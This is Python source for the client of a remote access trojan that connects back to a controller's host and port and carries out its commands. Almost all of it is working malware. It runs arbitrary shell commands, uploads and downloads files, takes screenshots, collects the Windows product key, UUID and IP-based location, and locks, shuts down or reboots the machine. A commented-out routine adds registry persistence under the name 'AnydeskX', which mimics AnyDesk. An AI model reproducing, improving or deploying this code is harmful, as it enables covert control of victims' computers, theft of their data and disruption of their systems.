#!/usr/bin
# Made by gokiimax
import socket
import subprocess
import time
import json
import os
import base64
import ctypes
import sys
import platform
from xmlrpc.client import Server
import pyautogui
import string
import random
from time import gmtime, strftime

import requests

#############################################################################

IP = 'localhost'
PORT = 6969

#############################################################################

class Startup:
   # Adds the script to startup
   def addStartup(registry_name):
       fp = os.path.dirname(os.path.realpath(__file__))
       file_name = sys.argv[0].split('\\')[-1]
       new_file_path = fp + "\\" + file_name
       keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
       key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
       SetValueEx(key2change, registry_name, 0, REG_SZ, new_file_path )

#=====================================================================#

class Utils:

    def get_random_string(length):
        # choose from all lowercase letter
        letters = string.ascii_lowercase
        result_str = ''.join(random.choice(letters) for i in range(length))
        return result_str

#=====================================================================#

    def get_windows_key():
        try:
            flags = 0x080000000
            sh = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
            key_windows_find = (subprocess.check_output(sh, creationflags=flags).decode().rstrip())
        except Exception:
            key_windows_find = "N/A"
        return key_windows_find
    
#=====================================================================#

    def get_windows_uuid():
        try:
            flags = 0x080000000
            sh = "wmic csproduct get uuid"
            windows_uuid = (subprocess.check_output(sh, creationflags=flags).decode().split("\n")[1].strip())
        except Exception:
            windows_uuid = "N/A"
        return windows_uuid

#=====================================================================#

    def get_sysinfo():

        ip = requests.get('https://ipinfo.io/json').json()

        info = f"""
        ╭──────────────────╮
        │               IP │ » {ip["ip"]}
        │           System │ » {platform.system()}  
        │        Processor │ » {platform.processor()}
        │       Local Time │ » {Utils.get_local_time()}
        │      Google Maps │ » {"https://www.google.com/maps/search/google+map++" + ip["loc"]}
        │      Windows Key │ » {Utils.get_windows_key()}
        │     Windows UUID │ » {Utils.get_windows_uuid()}
        │     Architecture │ » {platform.architecture()[0]}
        │     Network Name │ » {platform.node()}
        │ Operating System │ » {platform.platform()}
        ╰──────────────────╯
        
        """
        return info

#=====================================================================#

    def is_admin():
        try:
            temp = os.listdir(os.sep.join([os.environ.get("SystemRoot", "C:\windows"), 'temp']))
        except:
            admin = "[-] User Privileges!"
        else:
            admin = "[+] Administrator Privileges!"

        return admin

#=====================================================================#

    def get_local_time():
        return strftime("%d.%m.%Y %H:%M:%S", gmtime())


#=====================================================================#

    def take_ss():
        screen_shot = pyautogui.screenshot()
        global screenshot_name
        screenshot_name = Utils.get_random_string(16)
        screen_shot.save("./" + screenshot_name + ".png")

#=====================================================================#

    def turn_monitor_off():
        if sys.platform.startswith('linux'):
            import os
            os.system("xset dpms force off")

        elif sys.platform.startswith('win'):
            import win32gui
            import win32con
            SC_MONITORPOWER = 0xF170
            win32gui.SendMessageTimeout(win32con.HWND_BROADCAST,
                win32con.WM_SYSCOMMAND, 
                SC_MONITORPOWER, 2, 
                win32con.SMTO_NOTIMEOUTIFNOTHUNG, 
                1000)

#=====================================================================#

    def turn_monitor_on():
        if sys.platform.startswith('linux'):
            import os
            os.system("xset dpms force on")

        elif sys.platform.startswith('win'):
            import win32gui
            import win32con
            SC_MONITORPOWER = 0xF170
            win32gui.SendMessageTimeout(win32con.HWND_BROADCAST,
                win32con.WM_SYSCOMMAND, 
                SC_MONITORPOWER, 2, 
                win32con.SMTO_NOTIMEOUTIFNOTHUNG, 
                1000)


#=====================================================================#


class RatConnector:
    def __init__(self, ip, port):
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((ip, port))
                self.data_send(os.getlogin())
            except socket.error:
                print("[-] Server is not online? Try again in 5 seconds!")
                time.sleep(5)
            else:
                break

#=====================================================================#

    def data_send(self, data):
        jsonData = json.dumps(data)
        self.connection.send(jsonData.encode())

#=====================================================================#

    # Function for receiving data as JSON
    def data_receive(self):
        jsonData = b""
        while True:
            try:
                jsonData += self.connection.recv(1024)
                return json.loads(jsonData)
            # If ValueError returned then more data needs to be sent
            except ValueError:
                continue

#=====================================================================#

    def array_to_string(self, strings):
        convStr = ""
        for i in strings:
            convStr += " " + i 
        return convStr

#=====================================================================#

    # Run any command on the system
    def run_command(self, command):
        return subprocess.check_output(
            command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        )

#=====================================================================#

    # Reading files with base 64 encoding for non UTF-8 compatability
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

#=====================================================================#

    # Writing files, decode the b64 from the above function
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload complete"

#=====================================================================#

    def run(self):
         while True:
            command = self.data_receive()
            try:
                if command[0] == "close":
                    self.connection.close()
                    sys.exit()

                elif command[0] == "help":
                    commandResponse = ""
                
                elif command[0] == "clear":
                    commandResponse = ""

                elif command[0] == "screenshot":
                    Utils.take_ss()
                    commandResponse = self.read_file(screenshot_name + ".png").decode()

                elif command[0] == "cd" and len(command) > 1:
                    os.chdir(str(command[1]).replace("~", " "))
                    commandResponse = "[+] Changing active directory to " + command[1]
                
                elif command[0] == "upload":
                    commandResponse = self.write_file(command[1], command[2])

                elif command[0] == "download":
                    commandResponse = self.read_file(command[1]).decode()

                elif command[0] == "lock":
                    ctypes.windll.user32.LockWorkStation()
                    commandResponse = "[+] Clients PC locked"

                elif command[0] == "checkadmin":
                    commandResponse = Utils.is_admin()

                elif command[0] == "turnmonoff":
                    Utils.turn_monitor_off()
                    commandResponse = "[+] Clients Monitor Screen is now off"
                
                elif command[0] == "turnmonon":
                    Utils.turn_monitor_on()
                    commandResponse = "[+] Clients Monitor Screen is now on"

                elif command[0] == "localtime":
                    response = f"""
        ╭─────────────────────╮
        │ {Utils.get_local_time()} │
        ╰─────────────────────╯
                    """
                    commandResponse = response

                elif command[0] == "shutdown":
                    os.system("shutdown /s /t 1")

                elif command[0] == "whoami":
                    commandResponse = os.getlogin()

                elif command[0] == "reboot":
                    os.system("shutdown /r /t 1")
                
                elif command[0] == "sysinfo":
                    commandResponse = Utils.get_sysinfo()

                elif command[0] == "ls" or command[0] == "dir":
                    commandResponse = self.run_command("dir").decode('ISO-8859-1')
                
                else:
                    convCommand = self.array_to_string(command)
                    commandResponse = self.run_command(convCommand)
            # Whole error handling, bad practice but required to keep connection
            except Exception as e:
                commandResponse = f"[-] Error running command: {e}"
            self.data_send(commandResponse)

#=====================================================================#

# if os.name == "nt":
#     Startup.addStartup('AnydeskX')

ratClient = RatConnector(IP, PORT)
ratClient.run()
